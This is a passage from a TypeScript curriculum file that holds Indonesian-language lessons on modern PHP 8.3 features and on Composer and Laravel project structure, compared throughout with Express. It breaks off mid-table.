import {
  callout,
  checklist,
  code,
  compare,
  divider,
  h2,
  p,
  references,
  table,
  terms,
} from '@/lib/content/builders';
import { type LessonDraft, written } from '@/lib/curriculum/authoring';

/**
 * Backend Basic — Chapter 4, all fourteen lessons.
 *
 * Laravel 12 on PHP 8.3+. The chapter is written for a reader who has just finished Express, so
 * every concept is anchored to its Express counterpart — the point is not that Laravel is better
 * or worse, but that the same problems are solved by convention here and by assembly there.
 *
 * Two things get more space than a typical Laravel intro: mass assignment (4.8) and N+1 (4.9).
 * Both are far easier to cause with an ORM than with raw SQL, and both are invisible until they
 * are expensive.
 */
export const lessons: LessonDraft[] = [
  written(
    'php-modern',
    'PHP Modern Sekilas (8.3+)',
    18,
    'PHP hari ini, bukan PHP yang kamu dengar sepuluh tahun lalu.',
    [
      p(
        'PHP punya reputasi yang dibentuk versi 5.x: tanpa tipe, penuh fungsi global yang tidak konsisten, dan mudah ditulis sembarangan. PHP 8.3 adalah bahasa yang berbeda — bertipe, cepat, dan punya perkakas yang matang.',
      ),

      terms(
        {
          term: 'PHP 8.3',
          meaning:
            'Reputasi PHP dibentuk versi **5.x**: tanpa tipe, penuh fungsi global yang tidak konsisten, mudah ditulis sembarangan. PHP 8.3 adalah bahasa yang berbeda — bertipe, cepat, dan berperkakas matang. Menilainya dari ingatan sepuluh tahun lalu adalah menilai bahasa yang sudah tidak ada.',
        },
        {
          term: 'declare(strict_types=1)',
          meaning:
            'Baris **wajib** di setiap berkas PHP yang kamu buat. Tanpanya, PHP diam-diam mengubah tipe: fungsi yang meminta `int` menerima string `"5 catatan"` dan mengubahnya jadi `5`. Konversi diam adalah sumber bug halus dan, di jalur keamanan, sumber celah.',
        },
        {
          term: '$ pada variabel',
          meaning:
            'Setiap variabel PHP diawali tanda dolar — `$nama`. Ini bukan gaya melainkan sintaks: tanpa `$`, PHP membacanya sebagai nama konstanta atau fungsi, bukan variabel.',
        },
        {
          term: 'titik untuk menggabung string',
          meaning:
            "PHP memakai `.` untuk menyambung string, bukan `+`. Jebakan bagi yang datang dari JavaScript: `'Halo ' + $nama` di PHP mencoba **menjumlahkan**, bukan menyambung.",
        },
        {
          term: 'kutip tunggal vs ganda',
          meaning:
            'Interpolasi variabel **hanya bekerja di kutip ganda**. `"Halo $nama"` menghasilkan "Halo Ana"; `\'Halo $nama\'` menghasilkan literal `Halo $nama`. Perbedaan yang tidak ada padanannya di JavaScript.',
        },
        {
          term: 'array asosiatif',
          meaning:
            "PHP memakai **satu tipe** `array` untuk dua hal yang di JavaScript terpisah: daftar (`['a','b']`) dan peta (`['nama' => 'Ana']`). Padanan `Array` dan `Object` sekaligus, dalam satu tipe.",
        },
        {
          term: 'union type',
          meaning:
            'Tipe yang menerima beberapa kemungkinan — `int|string`. Tanda tanya di depan (`?Catatan`) adalah singkatan dari `Catatan|null`. Ini yang membuat "boleh kosong" jadi bagian tanda tangan fungsi, bukan asumsi.',
        },
        {
          term: 'promosi konstruktor',
          meaning:
            'Menulis properti langsung di parameter konstruktor — `public readonly int $jumlah`. Ia menggantikan tiga baris (deklarasi, parameter, penugasan) dengan satu, dan sekaligus menyatakan visibilitas serta kekekalannya.',
        },
        {
          term: 'readonly',
          meaning:
            'Properti yang **tidak bisa diubah** setelah objeknya dibuat. Ia mewujudkan nilai yang immutable di tingkat bahasa — bukan sekadar konvensi penamaan atau kesepakatan tim.',
        },
        {
          term: 'enum',
          meaning:
            'Tipe dengan sekumpulan nilai tetap — `Draf`, `Terbit`, `Arsip`. Dipakai di mana-mana di Laravel modern karena ia mengubah string bebas yang bisa salah ketik menjadi pilihan yang diperiksa compiler.',
        },
      ),

      h2('Sintaks dasar untuk yang datang dari JavaScript'),
      code(
        'php',
        `
        <?php

        declare(strict_types=1);   // WAJIB di setiap berkas — lihat catatan di bawah

        // Variabel selalu berawalan $
        $nama = 'Ana';
        $umur = 25;

        // Penggabungan string pakai titik, bukan +
        echo 'Halo ' . $nama;

        // Interpolasi hanya di kutip GANDA
        echo "Halo $nama, umur $umur";
        echo 'Halo $nama';           // -> literal: Halo $nama

        // Array: satu tipe untuk keduanya
        $daftar = ['a', 'b', 'c'];
        $peta = ['nama' => 'Ana', 'umur' => 25];

        // Fungsi panah
        $ganda = fn(int $n): int => $n * 2;

        // Null-safe dan null-coalescing — sama seperti ?. dan ?? di JS
        $kota = $pengguna?->alamat?->kota ?? 'Tidak diketahui';
        `,
      ),
      p(
        "Tiga baris di tengah adalah sumber kebingungan paling sering bagi yang datang dari JavaScript. Penggabungan string memakai **titik**, bukan `+`, karena `+` di PHP selalu berarti penjumlahan angka. Dan interpolasi `$nama` hanya bekerja di dalam kutip **ganda**: baris `echo 'Halo $nama'` mencetak apa adanya, termasuk tanda dolarnya. Perhatikan pula PHP tidak membedakan array dan objek seperti JavaScript — `$daftar` dan `$peta` sama-sama bertipe `array`, hanya berbeda kuncinya (angka berurutan versus string).",
      ),
      p(
        "Dua baris terakhir justru terasa akrab: `?->` sama persis dengan `?.` di JavaScript, dan `??` sama persis dengan `??`. Keduanya bisa dirantai, sehingga `$pengguna?->alamat?->kota` berhenti aman kalau `$pengguna` atau `alamat`-nya `null`, dan `?? 'Tidak diketahui'` mengisi nilai cadangannya. Baris `declare(strict_types=1)` di atas dibahas tersendiri di bawah — ia yang membedakan PHP modern dari PHP yang diam-diam mengubah tipe.",
      ),
      callout(
        'danger',
        '`declare(strict_types=1)` bukan opsional',
        'Tanpa baris itu, PHP diam-diam mengubah tipe: fungsi yang meminta `int` akan menerima string `"5 catatan"` dan mengubahnya jadi `5`. Konversi diam adalah sumber bug halus dan, di jalur keamanan, sumber celah. Tulis baris itu di **setiap** berkas PHP yang kamu buat.',
      ),

      h2('Tipe'),
      code(
        'php',
        `
        function hitungTotal(array $items, float $pajak = 0.11): float
        {
            $subtotal = array_sum(array_column($items, 'harga'));
            return $subtotal * (1 + $pajak);
        }

        // Union type
        function cari(int|string $kunci): ?Catatan { ... }   // ? = boleh null

        // Property yang tidak bisa diubah setelah dibuat
        final class Uang
        {
            public function __construct(
                public readonly int $jumlah,      // promosi konstruktor
                public readonly string $mataUang = 'IDR',
            ) {}
        }
        `,
      ),
      p(
        'Tipe di PHP modern ditulis di dua tempat: sebelum nama parameter (`array $items`) dan setelah tanda titik dua untuk return value (`: float`). Dipadukan dengan `strict_types=1`, keduanya menjadi jaminan yang ditegakkan saat program berjalan — memanggil `hitungTotal` dengan string akan melempar `TypeError` seketika, bukan menghasilkan angka yang aneh beberapa lapisan kemudian. Tanda `?` pada `?Catatan` berarti "boleh `null`", dan `int|string` adalah union type yang menerima salah satu dari keduanya.',
      ),
      p(
        'Kelas `Uang` memperlihatkan dua fitur yang akan sering kamu lihat di kode Laravel modern. **Promosi konstruktor** menggabungkan deklarasi properti dan penugasannya dalam satu baris — tanpanya kamu harus menulis properti di atas lalu `$this->jumlah = $jumlah;` di dalam konstruktor. Dan `readonly` membuat nilainya tidak bisa diubah setelah objek dibuat, sehingga sebuah nilai uang tidak mungkin berubah diam-diam di tengah perjalanan. Kata `final` di depan kelas melarangnya diwarisi, pilihan bawaan yang baik: pewarisan dibuka hanya kalau memang dirancang untuk itu.',
      ),

      h2('Enum — dipakai di mana-mana di Laravel modern'),
      code(
        'php',
        `
        enum StatusArtikel: string
        {
            case Draf = 'draf';
            case Terbit = 'terbit';
            case Arsip = 'arsip';

            public function label(): string
            {
                return match ($this) {
                    self::Draf => 'Draf',
                    self::Terbit => 'Terbit',
                    self::Arsip => 'Diarsipkan',
                };
            }
        }

        $status = StatusArtikel::from('terbit');       // melempar kalau tidak dikenal
        $status = StatusArtikel::tryFrom($input);      // null kalau tidak dikenal
        `,
      ),
      p(
        'Enum menggantikan konstanta string yang berserakan. Keadaan yang tidak sah jadi tidak bisa dinyatakan — prinsip yang sama dengan discriminated union di TypeScript.',
      ),

      h2('Padanan dengan JavaScript'),
      table(
        ['JavaScript', 'PHP'],
        [
          ['`const`/`let`', '`$nama` (tidak ada deklarasi)'],
          ['`array.map()`', '`array_map()`'],
          ['`array.filter()`', '`array_filter()`'],
          ['`obj?.prop`', '`$obj?->prop`'],
          ['`a ?? b`', '`$a ?? $b`'],
          ['`switch` yang mengembalikan nilai', '`match` (perbandingan ketat)'],
          ['`npm`', '`composer`'],
          ['`package.json`', '`composer.json`'],
        ],
      ),

      h2('Perkakas wajib'),
      code(
        'bash',
        `
        composer require --dev laravel/pint      # formatter, setara Prettier
        composer require --dev phpstan/phpstan   # analisis statis, setara TypeScript
        composer require --dev pestphp/pest      # test runner

        ./vendor/bin/pint                        # rapikan format
        ./vendor/bin/phpstan analyse --level=8   # cari bug tanpa menjalankan kode
        ./vendor/bin/pest                        # jalankan tes
        `,
      ),
      p(
        'Ketiganya dipasang dengan `--dev` karena hanya dibutuhkan saat mengembangkan, bukan saat aplikasi berjalan di server — setara `devDependencies` di npm. Perhatikan perintah menjalankannya berawalan `./vendor/bin/`: Composer memasang berkas yang bisa dieksekusi ke folder itu, sama seperti `node_modules/.bin` di ekosistem Node.',
      ),
      p(
        'Opsi `--level=8` pada PHPStan menentukan seberapa ketat pemeriksaannya. Levelnya bertingkat dari 0 sampai 9, dan level 8 adalah titik di mana **nilai `null` yang tidak diperiksa** mulai dianggap kesalahan — inilah yang membuatnya sebanding dengan `strictNullChecks` di TypeScript. Untuk project yang sudah berjalan, mulailah dari level rendah lalu naikkan bertahap; menyalakan level 8 sekaligus pada kode lama biasanya menghasilkan ribuan temuan yang membuat orang menyerah.',
      ),
      callout(
        'tip',
        'PHPStan level 8 mendekati TypeScript strict',
        'Ia menemukan properti yang tidak ada, tipe yang tidak cocok, dan nilai `null` yang tidak diperiksa — sebelum kodenya dijalankan. Project PHP tanpa analisis statis kehilangan sebagian besar jaring pengaman yang kamu nikmati di TypeScript.',
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Satu baris di puncak berkas PHP menentukan apakah kesalahan tipe akan berteriak atau berlalu diam-diam, dan bedanya jauh lebih besar daripada yang terlihat. Berikut fungsi yang sama persis, dijalankan dengan dan tanpa baris itu.',
      ),
      code(
        'php',
        `
        <?php
        declare(strict_types=1);

        function hitungTotal(int $harga, int $jumlah): int
        {
            return $harga * $jumlah;
        }
        `,
      ),
      code(
        'text',
        `
        DENGAN declare(strict_types=1):

          hitungTotal('89000', 2)  -> TypeError: Argument #1 ($harga) must be of type int,
                                     string given
          hitungTotal(89000.5, 2)  -> TypeError: Argument #1 ($harga) must be of type int,
                                     float given
          hitungTotal(null, 2)     -> TypeError: Argument #1 ($harga) must be of type int,
                                     null given
          hitungTotal(89000)       -> ArgumentCountError: Too few arguments to function
                                     hitungTotal(), 1 passed and exactly 2 expected

        TANPA baris itu — dan inilah BAWAAN PHP:

          hitungTotal('89000', 2)  -> 178000
          hitungTotal(89000.0, 2)  -> 178000
          hitungTotal(89000.5, 2)  -> 178000      <- pecahannya HILANG
          hitungTotal(true, 2)     -> 2           <- true menjadi 1
        `,
        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
      ),
      p(
        'Baris ketiga dan keempat pada kolom bawah yang paling merugikan. Nilai `89000.5` dipotong menjadi `89000` tanpa perhitungannya gagal, jadi sebuah harga berkoma yang tanpa sengaja masuk akan menghasilkan total yang salah dan tetap terlihat seperti angka yang wajar. Dan `true` berubah menjadi `1`, sehingga sebuah variabel yang keliru bernilai boolean menghasilkan total dua rupiah alih-alih sebuah error.',
      ),
      p(
        'Yang membuat ini lebih menjebak, PHP sebenarnya **punya** peringatan untuk pemotongan pecahan itu, dan peringatannya tidak tampil pada setelan bawaan.',
      ),
      code(
        'text',
        `
        Dengan error_reporting=E_ALL:

          PHP Deprecated: Implicit conversion from float 89000.5 to int loses precision

        Dengan setelan bawaan CLI PHP 8.3.6 (error_reporting=22527):

          (tidak ada apa-apa)
        `,
        { caption: 'Dijalankan sungguhan. Nilai 22527 memang tidak menyertakan E_DEPRECATED.' },
      ),
      p(
        'Jadi pada mesin pengembangan dengan setelan bawaan, dan di produksi yang biasanya mematikan tampilan error sepenuhnya, pemotongan itu **sama sekali tidak meninggalkan jejak**. Menuliskan `declare(strict_types=1)` di setiap berkas memindahkannya dari kategori "hilang diam-diam" ke kategori "gagal keras dan langsung terlihat".',
      ),
      callout(
        'warning',
        'Satu berkas, satu deklarasi — tidak menular',
        '`declare(strict_types=1)` hanya berlaku pada berkas tempat ia ditulis, dan yang diaturnya adalah **pemanggilan yang terjadi di berkas itu**. Menuliskannya di satu berkas tidak membuat berkas lain ikut ketat, dan memanggil fungsi ketat dari berkas longgar tetap memakai aturan longgar. Karena itu ia ditulis di **setiap** berkas, tanpa kecuali, dan itu pekerjaan yang layak diserahkan ke aturan linter alih-alih ingatan.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Fitur PHP modern sebagian besar bekerja dengan cara yang sama, yaitu memindahkan kesalahan dari "berlalu diam-diam" menjadi "gagal di tempat". Tiga berikut dijalankan sungguhan.',
      ),
      code(
        'text',
        `
        readonly — nilai yang tidak bisa berubah setelah dibuat

          $u = new Uang(8900000);
          $u->sen = 0;
            Error: Cannot modify readonly property Uang::$sen

          $u->tambah(new Uang(100000))->sen   -> 9000000    (objek BARU)
          $u->sen                              -> 8900000    (yang lama utuh)
          new Uang(-1)
            InvalidArgumentException: Uang tidak boleh negatif
        `,
        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
      ),
      p(
        'Gabungan `readonly` dengan pemeriksaan di konstruktor menghasilkan sesuatu yang berguna, yaitu objek yang **tidak pernah bisa berada dalam keadaan tidak sah**. Setelah `new Uang(...)` berhasil, tidak ada satu pun baris kode di mana pun yang bisa membuat nilainya negatif, sebab tidak ada jalan mengubahnya sama sekali.',
      ),
      code(
        'text',
        `
        enum — himpunan nilai yang tertutup

          StatusPesanan::from('dibayar')->name   -> 'Dibayar'
          StatusPesanan::from('menunggu')
            ValueError: "menunggu" is not a valid backing value for enum StatusPesanan
          StatusPesanan::tryFrom('menunggu')     -> NULL
          StatusPesanan::Dikirim->bolehDibatalkan() -> false
        `,
        { caption: 'Dijalankan sungguhan. from() melempar, tryFrom() mengembalikan null.' },
      ),
      p(
        'Perbedaan `from` dan `tryFrom` itu menentukan tempat pemakaiannya. Untuk nilai yang datang dari **basis datamu sendiri**, `from` yang benar, sebab nilai tak dikenal di sana memang menandakan data rusak dan harus berteriak. Untuk nilai yang datang dari **pengguna**, `tryFrom` yang benar, sebab masukan tak dikenal adalah kejadian biasa yang harus dijawab dengan pesan validasi, bukan dengan kegagalan server.',
      ),
      code(
        'text',
        `
        match — dan perbedaannya dari switch yang sering menjebak

          match (99) { 1 => 'satu', 2 => 'dua' }
            UnhandledMatchError: Unhandled match case 99

          match ('1') { 1 => 'angka satu', '1' => 'string satu' }   -> 'string satu'
          switch ('1') { case 1: ... }                              -> 'angka satu'
        `,
        {
          caption:
            'Dijalankan sungguhan. match memakai perbandingan ketat, switch memakai perbandingan longgar.',
        },
      ),
      p(
        "Dua baris terakhir itu selisih yang nyata. `switch` memakai perbandingan longgar, sehingga string `'1'` cocok dengan `case 1`. `match` memakai perbandingan ketat, sehingga keduanya berbeda. Dan `UnhandledMatchError` pada baris pertama justru fitur, sebab ia memaksa setiap nilai baru yang ditambahkan ke sebuah enum ditangani secara sadar alih-alih jatuh diam-diam ke cabang bawaan.",
      ),
      p('Terakhir, penanganan nilai kosong, dan yang ini menghasilkan peringatan alih-alih error.'),
      code(
        'text',
        `
          $pengguna->alamat->kota          // alamat bernilai null
            PHP Warning: Attempt to read property "kota" on null
            hasilnya: NULL — dan program TERUS BERJALAN

          $pengguna->alamat?->kota                  -> NULL, tanpa peringatan
          $pengguna->alamat?->kota ?? '(belum diisi)' -> '(belum diisi)'
        `,
        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
      ),
      p(
        'Perhatikan bahwa yang pertama hanya **peringatan**, bukan error, sehingga programnya terus berjalan dengan nilai `NULL` yang kemudian merambat ke perhitungan berikutnya. Di produksi dengan tampilan error dimatikan, peringatan itu tidak terlihat sama sekali, dan yang sampai ke pengguna adalah kolom kosong atau angka nol yang tidak bisa dijelaskan.',
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Sebagian besar kesalahan di sini berasal dari menulis PHP dengan kebiasaan PHP lama, yang memang sangat permisif.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Tidak menulis `declare(strict_types=1)`',
            'Kodenya tetap jalan',
            'Diuji sungguhan, `89000.5` dipotong jadi `89000` dan `true` jadi `1`, tanpa jejak apa pun di setelan bawaan',
          ],
          [
            'Menulis `strict_types` hanya di berkas utama',
            'Satu kali cukup',
            'Ia hanya berlaku di berkas tempat ia ditulis. Tulis di setiap berkas, dan tegakkan lewat linter',
          ],
          [
            'Memakai `from()` untuk nilai dari pengguna',
            'Enumnya kan sudah divalidasi',
            'Diuji sungguhan, nilai tak dikenal melempar `ValueError`. Untuk masukan pengguna, pakai `tryFrom()`',
          ],
          [
            'Memakai konstanta string untuk status',
            'Lebih sederhana daripada enum',
            'Salah ketik tidak tertangkap siapa pun. Enum membuat nilai tak dikenal gagal saat itu juga',
          ],
          [
            'Memakai `switch` untuk membandingkan nilai bertipe',
            'Sudah lama begitu',
            "Diuji sungguhan, `switch` memakai perbandingan longgar sehingga `'1'` cocok dengan `case 1`",
          ],
          [
            'Mengabaikan `PHP Warning` tentang properti pada null',
            'Cuma peringatan',
            'Programnya terus berjalan dengan `NULL` yang merambat, dan di produksi peringatannya tidak terlihat',
          ],
        ],
      ),
      p(
        "Baris keempat pantas diperjelas karena enum sering terasa berlebihan untuk sekadar empat status. Yang dibelinya bukan kerapian melainkan **jaminan**. Dengan konstanta string, sebuah salah ketik `'dibayarr'` di satu tempat menghasilkan baris yang tidak pernah terpilih oleh penyaringan mana pun, dan tidak ada satu pun error yang muncul. Dengan enum, nilai itu tidak akan pernah bisa masuk, sebab satu-satunya jalan membuatnya adalah lewat `from` atau `tryFrom` yang menolak nilai tak dikenal.",
      ),
      references(
        {
          label: 'PHP — Type declarations',
          href: 'https://www.php.net/manual/en/language.types.declarations.php',
          source: 'PHP',
          note: 'Termasuk arti `strict_types` dan akibatnya pada konversi tipe.',
        },
        {
          label: 'PHP — Enumerations',
          href: 'https://www.php.net/manual/en/language.enumerations.php',
          source: 'PHP',
          note: 'Enum berbacking string yang dipakai Laravel modern untuk kolom berstatus.',
        },
        {
          label: 'PHP — Constructor Promotion & readonly',
          href: 'https://www.php.net/manual/en/language.oop5.decon.php#language.oop5.decon.constructor.promotion',
          source: 'PHP',
          note: 'Bentuk ringkas deklarasi properti yang dipakai contoh kelas `Uang`.',
        },
        {
          label: 'Laravel Pint',
          href: 'https://laravel.com/docs/12.x/pint',
          source: 'Laravel',
          note: 'Formatter resmi Laravel — padanan Prettier di ekosistem PHP.',
        },
      ),
    ],
  ),

  written(
    'composer-struktur',
    'Composer & Struktur Project Laravel',
    15,
    'Manajer paket PHP dan peta folder yang akan kamu tinggali.',
    [
      terms(
        {
          term: 'Composer',
          meaning:
            'Manajer paket PHP — padanan npm. Ia mengunduh dependency ke folder `vendor/`, dan yang lebih penting: ia menghasilkan **autoloader**, peta yang membuat setiap kelas bisa dipakai tanpa `require` manual.',
        },
        {
          term: 'composer.lock',
          meaning:
            'Padanan `package-lock.json`. **Wajib di-commit**; `vendor/` **jangan**. Aturannya sama persis dengan Node: lockfile membuat pemasangan bisa diulang identik, dan `vendor/` dibangun ulang darinya.',
        },
        {
          term: 'composer install vs update',
          meaning:
            '`install` memasang **persis** yang tertulis di lockfile — ini yang dipakai CI dan produksi. `update` mengambil versi terbaru dalam rentang yang diizinkan **dan menulis ulang lockfile**. Bedanya sama dengan `npm ci` versus `npm install`.',
        },
        {
          term: 'autoload',
          meaning:
            'Mekanisme yang memuat berkas kelas secara otomatis saat kelasnya dipakai, berdasarkan nama dan namespace-nya. Ia yang membuat PHP modern tidak lagi penuh `require` di setiap berkas — dan `composer dump-autoload` yang membangun ulang petanya.',
        },
        {
          term: 'APP_KEY',
          meaning:
            'Kunci enkripsi aplikasi yang dibuat `php artisan key:generate`. Ia dipakai mengenkripsi cookie dan sesi. Kehilangannya berarti **semua sesi dan data terenkripsi menjadi tidak terbaca** — dan ia rahasia, jadi tidak pernah masuk repo.',
        },
        {
          term: 'artisan',
          meaning:
            'Perkakas baris perintah Laravel. Hampir semua pekerjaan berulang punya perintahnya — membuat controller, menjalankan migrasi, membersihkan cache. Dibahas tuntas di sub-bab 4.13.',
        },
        {
          term: 'public/',
          meaning:
            '**Satu-satunya** folder yang terbuka ke web. Seluruh kode aplikasi, konfigurasi, dan `.env` berada di luar jangkauan browser. Ini beda penting dari PHP era lama, di mana seluruh folder project sering diserahkan apa adanya ke server web.',
        },
        {
          term: 'routes/web.php vs api.php',
          meaning:
            'Dua berkas rute dengan perilaku berbeda. `web.php` memakai **sesi dan perlindungan CSRF**; `api.php` **stateless** dan tidak punya keduanya. Salah menaruh rute berarti salah model keamanan.',
        },
        {
          term: 'app/Services/',
          meaning:
            'Folder yang **tidak dibuat Laravel** — kamu yang membuatnya. Laravel menyediakan tempat untuk controller, model, dan request, tapi lapisan aturan bisnis adalah keputusanmu sendiri, sama seperti di Express.',
        },
      ),

      h2('Composer'),
      code(
        'bash',
        `
        composer install        # pasang dari composer.lock — untuk CI/produksi
        composer update         # perbarui & tulis ulang lockfile
        composer require nama/paket
        composer require --dev nama/paket
        composer dump-autoload  # muat ulang peta autoload
        `,
      ),
      p(
        'Dua perintah pertama gampang tertukar, dan bedanya sama seperti `npm ci` versus `npm install`. `composer install` memasang **persis** apa yang tertulis di `composer.lock` — inilah yang dipakai di CI dan produksi, karena ia menjamin server menjalankan versi yang sudah teruji. `composer update` mengabaikan lockfile, mencari versi terbaru yang masih cocok dengan rentang di `composer.json`, lalu **menulis ulang lockfile**. Jalankan `update` hanya saat kamu memang berniat memperbarui, dan jangan pernah di server.',
      ),
      p(
        '`composer dump-autoload` tidak punya padanan di npm dan sering membingungkan. PHP tidak punya `import`, sehingga kelas ditemukan lewat **peta autoload** yang disusun Composer dari struktur folder. Kalau kamu membuat kelas baru secara manual alih-alih lewat `php artisan make:`, lalu PHP mengeluh kelasnya tidak ditemukan padahal berkasnya jelas ada, perintah inilah jawabannya.',
      ),
      table(
        ['npm', 'Composer'],
        [
          ['`package.json`', '`composer.json`'],
          ['`package-lock.json`', '`composer.lock`'],
          ['`node_modules/`', '`vendor/`'],
          ['`npm ci`', '`composer install`'],
        ],
      ),
      callout(
        'warning',
        '`composer.lock` wajib di-commit, `vendor/` jangan',
        'Sama persis dengan aturan `package-lock.json` dan `node_modules/`. Lockfile yang di-commit membuat pemasangan bisa diulang identik; `vendor/` dibangun ulang dari lockfile itu.',
      ),

      h2('Membuat project'),
      code(
        'bash',
        `
        composer create-project laravel/laravel api-catatan
        cd api-catatan

        cp .env.example .env
        php artisan key:generate     # membuat APP_KEY
        php artisan serve            # http://localhost:8000
        `,
      ),
      p(
        'Dua baris di tengah adalah langkah yang paling sering terlewat dan menghasilkan error yang membingungkan. `cp .env.example .env` membuat berkas konfigurasi lokal — ingat dari Bab 3.12, hanya `.env.example` yang ikut di repositori, jadi berkas `.env`-nya memang belum ada setelah `create-project`. Lalu `key:generate` mengisi `APP_KEY` dengan kunci acak; kunci itu dipakai Laravel untuk mengenkripsi cookie dan sesi, dan tanpanya aplikasi menolak berjalan dengan pesan "No application encryption key has been specified".',
      ),
      p(
        'Karena `APP_KEY` menentukan enkripsi, ia adalah **rahasia**: setiap lingkungan punya kuncinya sendiri, dan menggantinya di produksi akan membuat seluruh sesi serta cookie terenkripsi yang ada menjadi tidak bisa dibaca. `php artisan serve` sendiri hanyalah server pengembangan bawaan PHP — cukup untuk belajar, tetapi produksi memakai Nginx atau Apache dengan konfigurasi yang dibahas di bawah.',
      ),

      h2('Struktur folder'),
      code(
        'text',
        `
        app/
        ├── Http/
        │   ├── Controllers/       menangani permintaan
        │   ├── Middleware/        berjalan sebelum controller
        │   ├── Requests/          validasi (Form Request)
        │   └── Resources/         bentuk respons JSON
        ├── Models/                model Eloquent
        ├── Policies/              aturan otorisasi
        ├── Services/              aturan bisnis (kamu yang membuatnya)
        └── Providers/             pendaftaran ke service container

        routes/
        ├── web.php                rute dengan sesi & CSRF
        ├── api.php                rute API (stateless)
        └── console.php            perintah artisan

        database/
        ├── migrations/            perubahan skema, berurutan
        ├── factories/             pembuat data uji
        └── seeders/               pengisi data awal

        config/                    berkas konfigurasi
        storage/                   log, cache, unggahan
        tests/                     Feature/ dan Unit/
        public/                    SATU-SATUNYA folder yang terbuka ke web
        `,
      ),
      p(
        'Bandingkan susunan ini dengan struktur Express di sub-bab 3.9, karena `Controllers/`, `Middleware/`, dan `Models/` punya padanan langsung. Bedanya, Laravel sudah **menyediakan** foldernya sejak awal beserta perintah `make:` untuk mengisinya, sementara di Express kamu yang menyusun sendiri. Perhatikan keterangan pada `app/Services/` di daftar istilah, bahwa folder itu **tidak** dibuat Laravel. Lapisan aturan bisnis tetap keputusanmu, dan tanpanya logika cenderung menumpuk di controller.',
      ),
      p(
        'Pembagian `routes/web.php` dan `routes/api.php` adalah keputusan keamanan, bukan kerapian. Rute di `web.php` mendapat sesi dan perlindungan CSRF — model dari sub-bab 5.3. Rute di `api.php` bersifat stateless dan **tidak** punya keduanya, karena API berbasis token memang tidak butuh mesin CSRF. Menaruh rute di berkas yang salah berarti memakai model keamanan yang salah: endpoint API di `web.php` akan menolak permintaan tanpa token CSRF, sedangkan form web di `api.php` kehilangan perlindungannya.',
      ),
      p(
        'Baris terakhir yang bertanda "SATU-SATUNYA" adalah hal terpenting di seluruh diagram ini. Berkas `.env` berisi seluruh rahasiamu berada di **akar** project, satu tingkat di atas `public/`. Karena itu document root server web wajib menunjuk ke `public/`; kalau ia menunjuk ke akar project, siapa pun bisa mengunduh `https://situs.com/.env` dan mendapat kredensial databasemu.',
      ),
      callout(
        'danger',
        'Hanya `public/` yang boleh terjangkau dari internet',
        'Document root server web **wajib** diarahkan ke `public/`, bukan ke akar project. Kalau salah, `.env` berisi seluruh rahasiamu bisa diunduh siapa pun lewat `https://situs.com/.env`. Ini kesalahan konfigurasi yang masih sering ditemukan di server sungguhan.',
      ),

      h2('Padanan dengan struktur Express'),
      table(
        ['Express (Bab 3.8)', 'Laravel'],
        [
          ['`routes/`', '`routes/api.php`'],
          ['`controllers/`', '`app/Http/Controllers/`'],
          ['`services/`', '`app/Services/` (kamu buat sendiri)'],
          ['`repositories/`', 'Model Eloquent, atau repository sendiri'],
          ['`middleware/`', '`app/Http/Middleware/`'],
          ['`schemas/` (Zod)', '`app/Http/Requests/`'],
          ['`config/env.js`', '`config/*.php` + `.env`'],
        ],
      ),
      p(
        'Perbedaan terbesarnya: di Express kamu **menyusun** struktur itu sendiri; di Laravel ia sudah ada dan diharapkan diikuti. Keduanya menyelesaikan masalah yang sama dengan cara berbeda.',
      ),

      h2('Berkas yang perlu kamu kenali sejak awal'),
      table(
        ['Berkas', 'Isinya'],
        [
          ['`.env`', 'Rahasia & konfigurasi — **di-gitignore**'],
          ['`config/app.php`', 'Nama aplikasi, zona waktu, debug'],
          ['`config/database.php`', 'Koneksi database'],
          ['`bootstrap/app.php`', 'Pendaftaran middleware & penanganan error (Laravel 11+)'],
          ['`routes/api.php`', 'Rute API'],
        ],
      ),
      h2('Studi kasus di project nyata'),
      p(
        'Autoloading terasa seperti keajaiban sampai ia berhenti bekerja, dan pada saat itu tidak ada yang tahu harus melihat ke mana. Berikut mekanismenya ditulis ulang dengan PHP polos lalu dijalankan, supaya terlihat apa yang sebenarnya dikerjakan Composer.',
      ),
      code(
        'php',
        `
        <?php
        // Inilah PSR-4, disederhanakan sampai intinya.
        $peta = ['App\\\\' => __DIR__ . '/src/'];

        spl_autoload_register(function (string $kelas) use ($peta) {
            foreach ($peta as $awalan => $dasar) {
                if (!str_starts_with($kelas, $awalan)) continue;
                $relatif = substr($kelas, strlen($awalan));
                // Namespace diterjemahkan menjadi JALUR FOLDER, satu lawan satu.
                $berkas = $dasar . str_replace('\\\\', '/', $relatif) . '.php';
                if (is_file($berkas)) { require $berkas; return; }
            }
        });
        `,
      ),
      code(
        'text',
        `
        Kelas dipakai, dan belum pernah di-require di mana pun:

          $p = new App\\Layanan\\Pesanan();

            dicari: /.../_phtest/src/Layanan/Pesanan.php
            DIMUAT
            hasil: dari App\\Layanan\\Pesanan

        Kelas yang berkasnya tidak ada:

          new App\\Layanan\\TidakAda();
            Error: Class "App\\Layanan\\TidakAda" not found
        `,
        { caption: 'Dijalankan sungguhan dengan PHP 8.3.6.' },
      ),
      p(
        'Baris `dicari:` itu yang paling berguna dihafal bentuknya, sebab ia menjelaskan seluruh kelas kegagalan autoloading. Nama namespace diterjemahkan menjadi jalur folder **satu lawan satu**, jadi `App\\Layanan\\Pesanan` dengan pemetaan `App\\` ke `src/` harus berada tepat di `src/Layanan/Pesanan.php`. Tidak ada pencarian, tidak ada penebakan, dan tidak ada toleransi.',
      ),
      p(
        'Karena penerjemahannya sekaku itu, `Class not found` hampir selalu berarti salah satu dari empat hal, dan keempatnya bisa diperiksa dalam hitungan detik.',
      ),
      table(
        ['Yang salah', 'Contohnya', 'Cara memeriksanya'],
        [
          [
            'Huruf besar kecil tidak cocok',
            '`src/layanan/Pesanan.php` untuk `App\\Layanan\\Pesanan`',
            'Linux peka huruf besar kecil; macOS dan Windows biasanya tidak, jadi ia lolos di laptop dan gagal di server',
          ],
          [
            'Nama berkas beda dari nama kelas',
            'Kelas `Pesanan` di berkas `pesanan.php`',
            'Nama berkas harus sama persis dengan nama kelasnya',
          ],
          [
